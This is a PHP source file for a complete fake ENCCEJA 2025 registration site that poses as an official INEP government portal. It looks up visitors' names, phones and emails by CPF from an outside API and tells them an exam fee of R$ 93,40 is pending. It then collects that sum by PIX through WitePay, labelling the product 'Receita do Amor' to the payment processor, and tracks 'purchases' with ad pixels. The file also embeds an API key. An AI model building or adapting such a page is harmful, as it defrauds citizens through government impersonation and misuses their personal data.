<?php
session_start();

// Configurações WitePay
$WITEPAY_API_KEY = 'wtp_7819b0bb469f4b52a96feca4ddc46ba4';
$GOOGLE_PIXEL_ID = '6859ccee5af20eab22a408ef';
$FACEBOOK_PIXELS = ['1418766538994503', '1345433039826605', '1390026985502891'];

// Função para chamar API WitePay
function callWitePayAPI($endpoint, $data) {
    global $WITEPAY_API_KEY;
    
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => 'https://api.witepay.com.br/v1/' . $endpoint,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => [
            'x-api-key: ' . $WITEPAY_API_KEY,
            'Content-Type: application/json'
        ],
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_TIMEOUT => 30
    ]);
    
    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    
    if ($httpCode === 200 || $httpCode === 201) {
        return json_decode($response, true);
    }
    
    return false;
}

// Função para buscar dados do CPF na API
function buscarDadosCPF($cpf) {
    $api_url = "https://webhook-manager.replit.app/api/v1/cliente?cpf=" . $cpf;
    
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $api_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5
    ]);
    
    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
    curl_close($curl);
    
    if ($httpCode === 200) {
        $data = json_decode($response, true);
        if ($data && $data['sucesso'] && isset($data['cliente'])) {
            return $data['cliente'];
        }
    }
    
    return null;
}

// Processar formulário de CPF
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'buscar_cpf') {
    $cpf = preg_replace('/\D/', '', $_POST['cpf'] ?? '');
    
    if (strlen($cpf) === 11) {
        $dadosCliente = buscarDadosCPF($cpf);
        
        if ($dadosCliente) {
            $_SESSION['customer_data'] = [
                'nome' => $dadosCliente['nome'] ?? '',
                'cpf' => $cpf,
                'telefone' => $dadosCliente['telefone'] ?? '',
                'email' => $dadosCliente['email'] ?? ''
            ];
            
            header('Location: ?page=encceja_info');
            exit;
        } else {
            $_SESSION['error'] = 'CPF não encontrado em nossa base de dados.';
        }
    } else {
        $_SESSION['error'] = 'CPF deve conter 11 dígitos.';
    }
}

// Processar formulário de dados pessoais
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'salvar_dados') {
    $_SESSION['customer_data'] = [
        'nome' => $_POST['nome'] ?? '',
        'cpf' => preg_replace('/\D/', '', $_POST['cpf'] ?? ''),
        'telefone' => preg_replace('/\D/', '', $_POST['telefone'] ?? ''),
        'email' => $_POST['email'] ?? '',
        'endereco' => $_POST['endereco'] ?? '',
        'cidade' => $_POST['cidade'] ?? '',
        'estado' => $_POST['estado'] ?? ''
    ];
    
    header('Location: ?page=pagamento');
    exit;
}

// Processar formulário de pagamento
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_payment') {
    $customerData = $_SESSION['customer_data'] ?? [];
    $nome = $customerData['nome'] ?? $_POST['nome'] ?? '';
    $cpf = $customerData['cpf'] ?? preg_replace('/\D/', '', $_POST['cpf'] ?? '');
    $telefone = $customerData['telefone'] ?? preg_replace('/\D/', '', $_POST['telefone'] ?? '');
    
    if ($nome && $cpf && $telefone) {
        // Criar pedido WitePay
        $orderData = callWitePayAPI('order/create', [
            'productData' => [[
                'name' => 'Receita do Amor',
                'value' => 9340
            ]],
            'clientData' => [
                'clientName' => $nome,
                'clientDocument' => $cpf,
                'clientEmail' => 'gerarpagamentos@gmail.com',
                'clientPhone' => $telefone
            ]
        ]);
        
        if ($orderData && isset($orderData['orderId'])) {
            // Criar cobrança PIX
            $chargeData = callWitePayAPI('charge/create', [
                'orderId' => $orderData['orderId'],
                'paymentMethod' => 'PIX'
            ]);
            
            if ($chargeData && isset($chargeData['pixCode'])) {
                $_SESSION['payment_data'] = [
                    'charge_id' => $chargeData['id'],
                    'pix_code' => $chargeData['pixCode'],
                    'amount' => 93.40,
                    'expires_at' => $chargeData['expiresAt'] ?? null,
                    'nome' => $nome,
                    'cpf' => $cpf
                ];
                
                header('Content-Type: application/json');
                echo json_encode([
                    'success' => true,
                    'id' => $chargeData['id'],
                    'pixCode' => $chargeData['pixCode'],
                    'amount' => 93.40,
                    'expiresAt' => $chargeData['expiresAt'] ?? null
                ]);
                exit;
            }
        }
    }
    
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Erro ao criar pagamento PIX']);
    exit;
}

// Verificar status do pagamento
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'check_payment') {
    $transactionId = $_POST['transactionId'] ?? '';
    
    if ($transactionId && isset($_SESSION['payment_status_' . $transactionId])) {
        $status = $_SESSION['payment_status_' . $transactionId];
        
        header('Content-Type: application/json');
        echo json_encode([
            'status' => $status['status'],
            'message' => $status['status'] === 'paid' ? 'Pagamento confirmado!' : 'Aguardando confirmação do pagamento'
        ]);
        exit;
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'pending', 'message' => 'Aguardando confirmação do pagamento']);
    exit;
}

// Webhook WitePay
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_GET['webhook'] === 'witepay') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if ($data && isset($data['chargeId']) && isset($data['status'])) {
        $chargeId = $data['chargeId'];
        $status = strtolower($data['status']);
        
        if (in_array($status, ['paid', 'completed', 'approved'])) {
            $_SESSION['payment_status_' . $chargeId] = [
                'status' => 'paid',
                'confirmed_at' => date('Y-m-d H:i:s'),
                'charge_id' => $chargeId
            ];
        }
    }
    
    http_response_code(200);
    echo 'OK';
    exit;
}

// Definir página atual
$page = $_GET['page'] ?? 'home';
$customerData = $_SESSION['customer_data'] ?? [];
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>ENCCEJA 2025 - Inscrição Nacional</title>
    <link rel="stylesheet" href="static/css/output.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/your-fontawesome-kit.js" crossorigin="anonymous"></script>
    
    <!-- Google Pixel -->
    <script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','<?php echo $GOOGLE_PIXEL_ID; ?>');
    </script>
    
    <!-- Facebook Pixels -->
    <?php foreach ($FACEBOOK_PIXELS as $pixelId): ?>
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window,document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '<?php echo $pixelId; ?>');
    fbq('track', 'PageView');
    </script>
    <?php endforeach; ?>
</head>
<body class="bg-gray-50">

<?php if ($page === 'home'): ?>
    <!-- Página Inicial ENCCEJA -->
    <div class="gov-header py-2">
        <div class="container mx-auto px-4">
            <span class="text-white text-sm">Portal do Governo Brasileiro</span>
        </div>
    </div>
    
    <div class="inep-header py-4">
        <div class="container mx-auto px-4">
            <div class="flex items-center">
                <img src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" 
                     alt="ENCCEJA 2025" class="h-16 mr-4">
                <div>
                    <h1 class="text-white text-2xl font-bold">ENCCEJA 2025</h1>
                    <p class="text-blue-200">Exame Nacional para Certificação de Competências de Jovens e Adultos</p>
                </div>
            </div>
        </div>
    </div>
    
    <div class="bg-gray-50 min-h-screen py-8">
        <div class="container mx-auto px-4">
            <?php if (isset($_SESSION['error'])): ?>
                <div class="max-w-md mx-auto mb-4 p-4 bg-red-100 border border-red-400 text-red-700 rounded">
                    <?php echo htmlspecialchars($_SESSION['error']); unset($_SESSION['error']); ?>
                </div>
            <?php endif; ?>
            
            <div class="max-w-md mx-auto bg-white rounded-lg shadow-lg">
                <div class="form-header p-4 rounded-t-lg">
                    <h2 class="text-xl font-semibold text-white">Consultar Inscrição ENCCEJA</h2>
                </div>
                
                <div class="p-6">
                    <form method="POST" class="space-y-4">
                        <input type="hidden" name="action" value="buscar_cpf">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">
                                CPF <span class="required-star">*</span>
                            </label>
                            <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required
                                   class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        </div>
                        <button type="submit" class="w-full py-3 px-4 rounded-md font-semibold transition duration-200" 
                                style="background-color: #5d85ab; color: white;" 
                                onmouseover="this.style.backgroundColor='#4d7396'" 
                                onmouseout="this.style.backgroundColor='#5d85ab'">
                            <i class="fas fa-search mr-2"></i>Consultar CPF
                        </button>
                    </form>
                    
                    <div class="mt-6 text-center">
                        <p class="text-sm text-gray-600">
                            <i class="fas fa-info-circle mr-1"></i>
                            Digite seu CPF para verificar se você possui inscrição pendente
                        </p>
                    </div>
                </div>
                
                <div class="form-footer p-4 rounded-b-lg">
                    <p class="text-sm text-white text-center">
                        <i class="fas fa-shield-alt mr-1"></i>
                        Sistema Oficial INEP - Dados protegidos
                    </p>
                </div>
            </div>
        </div>
    </div>

<?php elseif ($page === 'encceja_info'): ?>
    <!-- Página de Informações ENCCEJA -->
    <div class="gov-header py-2">
        <div class="container mx-auto px-4">
            <span class="text-white text-sm">Portal do Governo Brasileiro</span>
        </div>
    </div>
    
    <div class="inep-header py-4">
        <div class="container mx-auto px-4">
            <div class="flex items-center">
                <img src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" 
                     alt="ENCCEJA 2025" class="h-16 mr-4">
                <div>
                    <h1 class="text-white text-2xl font-bold">ENCCEJA 2025</h1>
                    <p class="text-blue-200">Dados da Inscrição Encontrados</p>
                </div>
            </div>
        </div>
    </div>
    
    <div class="bg-gray-50 min-h-screen py-8">
        <div class="container mx-auto px-4">
            <div class="max-w-2xl mx-auto">
                <div class="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-6">
                    <i class="fas fa-check-circle mr-2"></i>
                    <strong>Inscrição encontrada!</strong> Localizamos seus dados em nosso sistema.
                </div>
                
                <div class="bg-white rounded-lg shadow-lg">
                    <div class="form-header p-4 rounded-t-lg">
                        <h2 class="text-xl font-semibold text-white">Dados da Inscrição</h2>
                    </div>
                    
                    <div class="p-6">
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                            <div>
                                <label class="block text-sm font-medium text-gray-700">Nome Completo:</label>
                                <p class="text-lg font-semibold text-gray-800"><?php echo htmlspecialchars($customerData['nome'] ?? ''); ?></p>
                            </div>
                            <div>
                                <label class="block text-sm font-medium text-gray-700">CPF:</label>
                                <p class="text-lg font-semibold text-gray-800">
                                    <?php 
                                    $cpf = $customerData['cpf'] ?? '';
                                    if (strlen($cpf) === 11) {
                                        echo substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2);
                                    } else {
                                        echo $cpf;
                                    }
                                    ?>
                                </p>
                            </div>
                        </div>
                        
                        <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                            <div class="flex items-start">
                                <div class="flex-shrink-0">
                                    <i class="fas fa-exclamation-triangle text-yellow-400 text-xl"></i>
                                </div>
                                <div class="ml-3">
                                    <h3 class="text-sm font-medium text-yellow-800">Pendência de Pagamento</h3>
                                    <div class="mt-2 text-sm text-yellow-700">
                                        <p>Sua inscrição está pendente de pagamento da taxa obrigatória.</p>
                                        <p class="mt-1"><strong>Valor:</strong> R$ 93,40</p>
                                        <p class="mt-1"><strong>Prazo:</strong> Até 31/08/2025</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="text-center">
                            <a href="?page=dados_pessoais" 
                               class="inline-flex items-center px-6 py-3 border border-transparent text-base font-medium rounded-md text-white" 
                               style="background-color: #5d85ab;" 
                               onmouseover="this.style.backgroundColor='#4d7396'" 
                               onmouseout="this.style.backgroundColor='#5d85ab'">
                                <i class="fas fa-arrow-right mr-2"></i>
                                Continuar para Pagamento
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

<?php elseif ($page === 'dados_pessoais'): ?>
    <!-- Página de Dados Pessoais -->
    <div class="gov-header py-2">
        <div class="container mx-auto px-4">
            <span class="text-white text-sm">Portal do Governo Brasileiro</span>
        </div>
    </div>
    
    <div class="inep-header py-4">
        <div class="container mx-auto px-4">
            <div class="flex items-center">
                <img src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" 
                     alt="ENCCEJA 2025" class="h-16 mr-4">
                <div>
                    <h1 class="text-white text-2xl font-bold">ENCCEJA 2025</h1>
                    <p class="text-blue-200">Confirmar Dados Pessoais</p>
                </div>
            </div>
        </div>
    </div>
    
    <div class="bg-gray-50 min-h-screen py-8">
        <div class="container mx-auto px-4">
            <div class="max-w-2xl mx-auto bg-white rounded-lg shadow-lg">
                <div class="form-header p-4 rounded-t-lg">
                    <h2 class="text-xl font-semibold text-white">Confirmar Dados para Pagamento</h2>
                </div>
                
                <form method="POST" class="p-6">
                    <input type="hidden" name="action" value="salvar_dados">
                    
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <div class="col-span-full">
                            <label class="block text-sm font-medium text-gray-700 mb-1">
                                Nome Completo <span class="required-star">*</span>
                            </label>
                            <input type="text" name="nome" required
                                   value="<?php echo htmlspecialchars($customerData['nome'] ?? ''); ?>"
                                   class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        </div>
                        
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">
                                CPF <span class="required-star">*</span>
                            </label>
                            <input type="text" name="cpf" id="cpf_dados" required readonly
                                   value="<?php 
                                   $cpf = $customerData['cpf'] ?? '';
                                   if (strlen($cpf) === 11) {
                                       echo substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2);
                                   } else {
                                       echo $cpf;
                                   }
                                   ?>"
                                   class="w-full px-3 py-2 border border-gray-300 rounded-md bg-gray-100">
                        </div>
                        
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">
                                Telefone <span class="required-star">*</span>
                            </label>
                            <input type="text" name="telefone" id="telefone_dados" required
                                   value="<?php echo htmlspecialchars($customerData['telefone'] ?? ''); ?>"
                                   class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        </div>
                        
                        <div class="col-span-full">
                            <label class="block text-sm font-medium text-gray-700 mb-1">
                                E-mail <span class="required-star">*</span>
                            </label>
                            <input type="email" name="email" required
                                   value="<?php echo htmlspecialchars($customerData['email'] ?? ''); ?>"
                                   class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
                        </div>
                    </div>
                    
                    <div class="mt-6 text-center">
                        <button type="submit" 
                                class="px-8 py-3 rounded-md font-semibold transition duration-200" 
                                style="background-color: #5d85ab; color: white;" 
                                onmouseover="this.style.backgroundColor='#4d7396'" 
                                onmouseout="this.style.backgroundColor='#5d85ab'">
                            <i class="fas fa-arrow-right mr-2"></i>
                            Ir para Pagamento
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </div>

<?php elseif ($page === 'pagamento'): ?>
    <!-- Página de Pagamento -->
    <div class="min-h-screen bg-gradient-to-br from-green-50 to-emerald-100">
        <div class="container mx-auto px-4 py-8">
            <div class="text-center mb-8">
                <img src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" 
                     alt="ENCCEJA 2025" class="mx-auto h-20 mb-4">
                <h1 class="text-2xl font-bold text-gray-800">Finalizar Inscrição</h1>
            </div>
            
            <div class="max-w-lg mx-auto bg-white rounded-lg shadow-lg p-6">
                <div class="text-center mb-6">
                    <div class="text-3xl font-bold text-green-600">R$ 93,40</div>
                    <p class="text-gray-600">Taxa de Inscrição ENCCEJA 2025</p>
                </div>
                
                <div class="mb-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                    <div class="flex items-center">
                        <i class="fas fa-info-circle text-blue-500 mr-3"></i>
                        <div>
                            <h3 class="font-semibold text-blue-800">Dados da Inscrição</h3>
                            <p class="text-sm text-blue-700 mt-1">
                                <strong>Nome:</strong> <?php echo htmlspecialchars($customerData['nome'] ?? 'Não informado'); ?><br>
                                <strong>CPF:</strong> <?php 
                                $cpf = $customerData['cpf'] ?? '';
                                if (strlen($cpf) === 11) {
                                    echo substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2);
                                } else {
                                    echo $cpf;
                                }
                                ?>
                            </p>
                        </div>
                    </div>
                </div>
                
                <form id="paymentForm" class="space-y-4">
                    <input type="hidden" name="action" value="create_payment">
                    
                    <div class="text-center mb-4">
                        <button type="submit" class="w-full py-4 px-6 rounded-lg font-semibold text-lg transition duration-200" 
                                style="background-color: #5d85ab; color: white;" 
                                onmouseover="this.style.backgroundColor='#4d7396'" 
                                onmouseout="this.style.backgroundColor='#5d85ab'">
                            <i class="fas fa-qrcode mr-2"></i>
                            Gerar PIX para Pagamento
                        </button>
                    </div>
                    
                    <div class="text-center text-sm text-gray-600">
                        <p><i class="fas fa-shield-alt mr-1"></i>Pagamento seguro via PIX</p>
                        <p class="mt-1">Após o pagamento, sua inscrição será confirmada automaticamente</p>
                    </div>
                </form>
                
                <!-- Resultado PIX -->
                <div id="pixResult" class="hidden mt-6 p-4 bg-gray-50 rounded-lg">
                    <h3 class="font-semibold text-gray-800 mb-3">Pagamento PIX Gerado</h3>
                    <div class="text-center">
                        <div id="qrcode" class="mb-4"></div>
                        <p class="text-sm text-gray-600 mb-2">Código PIX:</p>
                        <div id="pixCode" class="bg-white p-2 rounded border text-xs break-all mb-4"></div>
                        <button onclick="copyPixCode()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
                            Copiar Código PIX
                        </button>
                    </div>
                    <div id="paymentStatus" class="mt-4 text-center">
                        <p class="text-yellow-600">Aguardando pagamento...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

<?php endif; ?>

<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
<script>
// Máscaras para CPF e telefone aplicadas em todos os campos
function formatCPF(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 11) value = value.substring(0, 11);
    
    if (value.length > 9) {
        value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
    } else if (value.length > 6) {
        value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
    } else if (value.length > 3) {
        value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
    }
    
    input.value = value;
}

function formatPhone(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 11) value = value.substring(0, 11);
    
    if (value.length > 6) {
        value = value.replace(/(\d{2})(\d{5})(\d{1,4})/, '($1) $2-$3');
    } else if (value.length > 2) {
        value = value.replace(/(\d{2})(\d{1,5})/, '($1) $2');
    }
    
    input.value = value;
}

// Aplicar máscaras em todos os campos CPF e telefone
document.addEventListener('DOMContentLoaded', function() {
    // CPF
    const cpfFields = document.querySelectorAll('#cpf, #cpf_dados, input[name="cpf"]');
    cpfFields.forEach(field => {
        field.addEventListener('input', function() { formatCPF(this); });
        field.addEventListener('keydown', function(e) {
            // Permitir apenas números e teclas de controle
            if (!/[\d\b\t\r\n]/.test(e.key) && !e.ctrlKey && !e.metaKey) {
                e.preventDefault();
            }
        });
    });
    
    // Telefone
    const phoneFields = document.querySelectorAll('#telefone, #telefone_dados, input[name="telefone"]');
    phoneFields.forEach(field => {
        field.addEventListener('input', function() { formatPhone(this); });
        field.addEventListener('keydown', function(e) {
            // Permitir apenas números e teclas de controle
            if (!/[\d\b\t\r\n]/.test(e.key) && !e.ctrlKey && !e.metaKey) {
                e.preventDefault();
            }
        });
    });
    
    // Validação de formulários
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            const cpfField = form.querySelector('input[name="cpf"]');
            if (cpfField && cpfField.value.replace(/\D/g, '').length !== 11) {
                e.preventDefault();
                alert('CPF deve conter 11 dígitos.');
                return false;
            }
            
            const phoneField = form.querySelector('input[name="telefone"]');
            if (phoneField && phoneField.value.replace(/\D/g, '').length < 10) {
                e.preventDefault();
                alert('Telefone deve conter DDD + número.');
                return false;
            }
        });
    });
});

// Formulário de pagamento
document.getElementById('paymentForm')?.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formData = new FormData();
    formData.append('action', 'create_payment');
    
    // Pegar dados dos campos ou da sessão
    const nomeField = document.getElementById('nome');
    const cpfField = document.getElementById('cpf'); 
    const telefoneField = document.getElementById('telefone');
    
    if (nomeField) formData.append('nome', nomeField.value);
    if (cpfField) formData.append('cpf', cpfField.value);
    if (telefoneField) formData.append('telefone', telefoneField.value);
    
    // Desabilitar botão de submit
    const submitBtn = e.target.querySelector('button[type="submit"]');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Gerando PIX...';
    }
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showPixResult(data);
            startPaymentChecking(data.id);
            
            // Trigger Meta Pixel Purchase event
            <?php foreach ($FACEBOOK_PIXELS as $pixelId): ?>
            if (typeof fbq !== 'undefined') {
                fbq('track', 'Purchase', {
                    value: 93.40,
                    currency: 'BRL',
                    content_ids: ['encceja_2025'],
                    content_type: 'product'
                });
            }
            <?php endforeach; ?>
            
        } else {
            alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente'));
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-qrcode mr-2"></i>Gerar PIX para Pagamento';
            }
        }
    })
    .catch(error => {
        alert('Erro de conexão. Tente novamente.');
        if (submitBtn) {
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<i class="fas fa-qrcode mr-2"></i>Gerar PIX para Pagamento';
        }
    });
});

function showPixResult(data) {
    const pixResult = document.getElementById('pixResult');
    const pixCode = document.getElementById('pixCode');
    const qrcode = document.getElementById('qrcode');
    
    if (pixCode) pixCode.textContent = data.pixCode;
    if (pixResult) pixResult.classList.remove('hidden');
    
    // Gerar QR Code
    if (qrcode && typeof QRCode !== 'undefined') {
        qrcode.innerHTML = ''; // Limpar QR code anterior
        QRCode.toCanvas(qrcode, data.pixCode, {
            width: 200,
            margin: 2,
            color: {
                dark: '#000000',
                light: '#FFFFFF'
            }
        }, function (error) {
            if (error) console.error('Erro ao gerar QR Code:', error);
        });
    }
}

function copyPixCode() {
    const pixCode = document.getElementById('pixCode');
    if (pixCode && pixCode.textContent) {
        navigator.clipboard.writeText(pixCode.textContent).then(() => {
            alert('Código PIX copiado!');
        }).catch(err => {
            // Fallback para navegadores mais antigos
            const textArea = document.createElement('textarea');
            textArea.value = pixCode.textContent;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
            alert('Código PIX copiado!');
        });
    }
}

let currentTransactionId = null;
let paymentCheckInterval = null;

function startPaymentChecking(transactionId) {
    currentTransactionId = transactionId;
    
    // Limpar interval anterior se existir
    if (paymentCheckInterval) {
        clearInterval(paymentCheckInterval);
    }
    
    // Verificar imediatamente
    checkPaymentStatus();
    
    // Verificar a cada 3 segundos
    paymentCheckInterval = setInterval(checkPaymentStatus, 3000);
}

function checkPaymentStatus() {
    if (!currentTransactionId) return;
    
    const formData = new FormData();
    formData.append('action', 'check_payment');
    formData.append('transactionId', currentTransactionId);
    
    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        const statusDiv = document.getElementById('paymentStatus');
        
        if (data.status === 'paid') {
            if (statusDiv) {
                statusDiv.innerHTML = '<div class="text-center p-4 bg-green-100 rounded-lg"><p class="text-green-600 font-semibold text-lg"><i class="fas fa-check-circle mr-2"></i>Pagamento confirmado!</p><p class="text-sm text-green-600 mt-2">Sua inscrição foi processada com sucesso.</p></div>';
            }
            
            // Parar verificação
            if (paymentCheckInterval) {
                clearInterval(paymentCheckInterval);
                paymentCheckInterval = null;
            }
            
            // Trigger UTMFY Google conversion
            if (typeof gtag !== 'undefined') {
                gtag('event', 'purchase', {
                    transaction_id: currentTransactionId,
                    value: 93.40,
                    currency: 'BRL',
                    items: [{
                        item_id: 'encceja_2025',
                        item_name: 'Inscrição ENCCEJA 2025',
                        category: 'Educação',
                        quantity: 1,
                        price: 93.40
                    }]
                });
            }
            
            // Redirecionar após 3 segundos
            setTimeout(function() {
                window.location.href = '?page=sucesso';
            }, 3000);
            
        } else if (statusDiv) {
            statusDiv.innerHTML = '<p class="text-yellow-600"><i class="fas fa-clock mr-2"></i>' + (data.message || 'Aguardando pagamento...') + '</p>';
        }
    })
    .catch(error => {
        console.error('Erro ao verificar pagamento:', error);
    });
}
</script>

</body>
</html>